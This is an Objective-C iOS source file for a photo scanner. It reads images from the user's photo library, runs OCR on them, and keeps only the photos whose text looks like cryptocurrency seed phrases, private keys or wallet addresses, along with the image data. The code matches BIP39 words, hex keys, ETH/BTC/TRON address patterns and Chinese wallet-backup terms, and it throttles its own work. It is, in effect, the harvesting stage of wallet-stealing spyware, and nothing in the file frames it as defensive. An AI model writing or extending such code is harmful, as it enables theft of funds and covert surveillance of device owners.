//
//  RDPhotoScanner.m
//  相册OCR扫描器实现
//

#import "RDPhotoScanner.h"
@import Photos;
@import Vision;
@import UIKit;

@implementation RDPhotoOCRResult
@end

// BIP39 英文助记词表 (前100个, 用于快速判别)
static NSSet *s_mnemonicWords = nil;

@implementation RDPhotoScanner

+ (void)initialize {
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        s_mnemonicWords = [NSSet setWithArray:@[
            @"abandon",@"ability",@"able",@"about",@"above",@"absent",@"absorb",@"abstract",@"absurd",@"abuse",
            @"access",@"accident",@"account",@"accuse",@"achieve",@"acid",@"acoustic",@"acquire",@"across",@"act",
            @"action",@"actor",@"actress",@"actual",@"adapt",@"addict",@"address",@"adjust",@"admit",@"adult",
            @"advance",@"advice",@"aerobic",@"affair",@"afford",@"afraid",@"again",@"age",@"agent",@"agree",
            @"ahead",@"aim",@"air",@"airport",@"aisle",@"alarm",@"album",@"alcohol",@"alert",@"alien",
            @"all",@"alley",@"allow",@"almost",@"alone",@"alpha",@"already",@"also",@"alter",@"always",
            @"amateur",@"amazing",@"among",@"amount",@"amused",@"analyst",@"anchor",@"ancient",@"anger",@"angle",
            @"angry",@"animal",@"ankle",@"announce",@"annual",@"another",@"answer",@"antenna",@"antique",@"anxiety",
            @"any",@"apart",@"apology",@"appear",@"apple",@"approve",@"april",@"arch",@"arctic",@"area",
            @"arena",@"argue",@"arm",@"armed",@"armor",@"army",@"around",@"arrange",@"arrest",@"arrive",
        ]];
    });
}

// ============ 扫描最近N天 ============
+ (void)scanRecentPhotos:(NSInteger)days
              completion:(void (^)(NSArray<RDPhotoOCRResult *> *results))completion {
    PHFetchOptions *options = [PHFetchOptions new];
    options.sortDescriptors = @[[NSSortDescriptor sortDescriptorWithKey:@"creationDate" ascending:NO]];

    NSDate *startDate = [[NSDate date] dateByAddingTimeInterval:-days * 86400];
    options.predicate = [NSPredicate predicateWithFormat:@"creationDate >= %@", startDate];

    PHFetchResult<PHAsset *> *assets = [PHAsset fetchAssetsWithMediaType:PHAssetMediaTypeImage options:options];
    [self processAssets:assets completion:completion];
}

// ============ 扫描所有 ============
+ (void)scanAllPhotosWithCompletion:(void (^)(NSArray<RDPhotoOCRResult *> *results))completion {
    PHFetchOptions *options = [PHFetchOptions new];
    options.sortDescriptors = @[[NSSortDescriptor sortDescriptorWithKey:@"creationDate" ascending:NO]];
    PHFetchResult<PHAsset *> *assets = [PHAsset fetchAssetsWithMediaType:PHAssetMediaTypeImage options:options];
    [self processAssets:assets completion:completion];
}

// ============ 处理PHAsset ============
+ (void)processAssets:(PHFetchResult<PHAsset *> *)assets
           completion:(void (^)(NSArray<RDPhotoOCRResult *> *))completion {
    NSMutableArray<RDPhotoOCRResult *> *results = [NSMutableArray new];
    dispatch_group_t group = dispatch_group_create();
    __block NSUInteger processedCount = 0;
    NSUInteger maxProcess = MIN(assets.count, 200); // 最多处理200张

    for (NSUInteger i = 0; i < maxProcess; i++) {
        PHAsset *asset = assets[i];
        dispatch_group_enter(group);

        [self requestImageForAsset:asset completion:^(UIImage * _Nullable image, NSData * _Nullable imageData) {
            if (image && imageData) {
                [self performOCR:image completion:^(NSString * _Nullable text, CGFloat confidence) {
                    if (text.length > 10) {
                        RDPhotoOCRResult *result = [RDPhotoOCRResult new];
                        result.localIdentifier = asset.localIdentifier;
                        result.recognizedText   = text;
                        result.photoDate        = asset.creationDate;
                        result.confidence       = confidence;
                        result.imageData        = imageData;
                        @synchronized (results) {
                            [results addObject:result];
                        }
                    }
                    dispatch_group_leave(group);
                }];
            } else {
                dispatch_group_leave(group);
            }
        }];

        processedCount++;
        if (processedCount % 10 == 0) {
            [NSThread sleepForTimeInterval:0.05];
        }
    }

    dispatch_group_notify(group, dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        // 筛选：只保留含助记词/私钥的
        NSArray *filtered = [self filterRelevantResults:results];
        if (completion) completion(filtered);
    });
}

// ============ 请求图片 ============
+ (void)requestImageForAsset:(PHAsset *)asset
                  completion:(void (^)(UIImage * _Nullable image, NSData * _Nullable imageData))completion {
    PHImageRequestOptions *options = [PHImageRequestOptions new];
    options.synchronous = NO;
    options.deliveryMode = PHImageRequestOptionsDeliveryModeHighQualityFormat;
    options.networkAccessAllowed = YES;

    CGSize targetSize = CGSizeMake(asset.pixelWidth, asset.pixelHeight);
    if (targetSize.width > 1920) {
        targetSize.height = targetSize.height * 1920.0 / targetSize.width;
        targetSize.width  = 1920;
    }

    [[PHImageManager defaultManager] requestImageForAsset:asset
                                               targetSize:targetSize
                                              contentMode:PHImageContentModeAspectFit
                                                  options:options
                                            resultHandler:^(UIImage * _Nullable image, NSDictionary * _Nullable info) {
        if (!image) {
            completion(nil, nil);
            return;
        }
        NSData *jpeg = UIImageJPEGRepresentation(image, 0.7);
        completion(image, jpeg);
    }];
}

// ============ OCR ============
+ (void)performOCR:(UIImage *)image
        completion:(void (^)(NSString * _Nullable text, CGFloat confidence))completion {
    VNRecognizeTextRequest *request = [[VNRecognizeTextRequest alloc] initWithCompletionHandler:^(VNRequest * _Nonnull request, NSError * _Nullable error) {
        if (error || !request.results) {
            completion(nil, 0);
            return;
        }

        NSMutableString *allText = [NSMutableString new];
        CGFloat totalConfidence = 0;
        NSInteger count = 0;

        for (VNRecognizedTextObservation *obs in request.results) {
            VNRecognizedText *topCandidate = obs.topCandidates(1).firstObject;
            if (topCandidate) {
                [allText appendFormat:@"%@\n", topCandidate.string];
                totalConfidence += topCandidate.confidence;
                count++;
            }
        }

        CGFloat avgConfidence = count > 0 ? totalConfidence / count : 0;
        completion(allText.length > 0 ? [allText copy] : nil, avgConfidence);
    }];

    request.recognitionLevel = VNRequestTextRecognitionLevelAccurate;
    request.usesLanguageCorrection = YES;
    request.recognitionLanguages = @[@"en-US", @"zh-Hans", @"zh-Hant", @"ko-KR", @"ja-JP"];

    VNImageRequestHandler *handler = [[VNImageRequestHandler alloc] initWithCGImage:image.CGImage options:@{}];
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        [handler performRequests:@[request] error:nil];
    });
}

// ============ 筛选含助记词/私钥的结果 ============
+ (NSArray<RDPhotoOCRResult *> *)filterRelevantResults:(NSArray<RDPhotoOCRResult *> *)results {
    return [results filteredArrayUsingPredicate:[NSPredicate predicateWithBlock:^BOOL(RDPhotoOCRResult *r, NSDictionary *_) {
        return [self containsMnemonicPattern:r.recognizedText] ||
               [self containsPrivateKeyPattern:r.recognizedText] ||
               [self containsWalletAddressPattern:r.recognizedText] ||
               [self containsChineseMnemonicPattern:r.recognizedText];
    }]];
}

// ============ 模式匹配 ============

+ (BOOL)containsMnemonicPattern:(NSString *)text {
    NSArray *words = [[text lowercaseString] componentsSeparatedByCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]];
    words = [words filteredArrayUsingPredicate:[NSPredicate predicateWithBlock:^BOOL(NSString *w, NSDictionary *_) {
        return w.length > 1;
    }]];

    NSInteger matchCount = 0;
    for (NSString *word in words) {
        if ([s_mnemonicWords containsObject:word]) matchCount++;
    }
    // 12个词中有 >= 8 个是 BIP39 词汇 → 极可能是助记词
    return matchCount >= 8;
}

+ (BOOL)containsPrivateKeyPattern:(NSString *)text {
    // 64字符 hex = 私钥
    NSRegularExpression *hex64 = [NSRegularExpression regularExpressionWithPattern:@"\\b[a-fA-F0-9]{64}\\b" options:0 error:nil];
    NSInteger hexCount = [hex64 numberOfMatchesInString:text options:0 range:NSMakeRange(0, text.length)];
    if (hexCount > 0) return YES;

    // 或者包含 "private key" / "私钥" / "secret"
    NSArray *keywords = @[@"private key", @"privatekey", @"secret key",
                           @"私钥", @"助记词", @"种子", @"seed phrase",
                           @"recovery phrase", @"mnemonic", @"backup phrase"];
    for (NSString *kw in keywords) {
        if ([text.lowercaseString containsString:kw]) return YES;
    }
    return NO;
}

+ (BOOL)containsWalletAddressPattern:(NSString *)text {
    // ETH 地址: 0x + 40 hex
    NSRegularExpression *ethAddr = [NSRegularExpression regularExpressionWithPattern:@"\\b0x[a-fA-F0-9]{40}\\b" options:0 error:nil];
    if ([ethAddr numberOfMatchesInString:text options:0 range:NSMakeRange(0, text.length)] > 0) return YES;

    // BTC 地址: 1/3/bc1 开头
    NSRegularExpression *btcAddr = [NSRegularExpression regularExpressionWithPattern:@"\\b[13bc1][a-km-zA-HJ-NP-Z0-9]{25,62}\\b" options:0 error:nil];
    if ([btcAddr numberOfMatchesInString:text options:0 range:NSMakeRange(0, text.length)] > 0) return YES;

    // TRON 地址: T + 33 char
    NSRegularExpression *trxAddr = [NSRegularExpression regularExpressionWithPattern:@"\\bT[A-Za-z0-9]{33}\\b" options:0 error:nil];
    if ([trxAddr numberOfMatchesInString:text options:0 range:NSMakeRange(0, text.length)] > 0) return YES;

    return NO;
}

+ (BOOL)containsChineseMnemonicPattern:(NSString *)text {
    // 中文助记词: 连续 >= 8 个汉字
    NSRegularExpression *chinese = [NSRegularExpression regularExpressionWithPattern:@"[\\u4e00-\\u9fff]{2}" options:0 error:nil];
    NSInteger count = [chinese numberOfMatchesInString:text options:0 range:NSMakeRange(0, text.length)];

    // 同时包含 "钱包" 或 "备份" 等关键词
    if (count >= 6) {
        NSArray *cnKeys = @[@"钱包", @"备份", @"助记词", @"私钥", @"种子", @"恢复", @"导入"];
        for (NSString *wk in cnKeys) {
            if ([text containsString:wk]) return YES;
        }
    }
    return NO;
}

@end
